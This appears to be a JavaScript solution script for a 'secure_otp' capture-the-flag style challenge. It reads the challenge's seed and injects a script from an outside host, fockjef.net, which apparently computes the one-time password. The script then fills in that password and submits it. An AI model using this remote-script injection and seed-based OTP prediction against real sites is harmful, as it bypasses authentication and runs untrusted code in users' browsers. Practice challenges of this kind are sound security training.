(function( challenge_id = "secure_otp" ){

    runSolution( { challenge_id, solution } );

    async function solution( tag ){
        while( !/Time Remaining/.test(tag.refs.challengeContent.innerText) ){
            await sleep(100);
        }
        let seed = tag.challenge.seed,
            callback = "secure_otp_" + seed;
        window[callback] = function(otp){
            console.info( otp );
            tag.refs.answer.value = otp;
            tag.submit({});
        }
        document.head.appendChild(document.createElement("script")).src = `https://fockjef.net/canyouhackit/secure_otp.py?callback=${callback}&seed=${seed}`;
    }

    function sleep( ms ){
        return new Promise( resolve => setTimeout( resolve, ms ) );
    }
})();
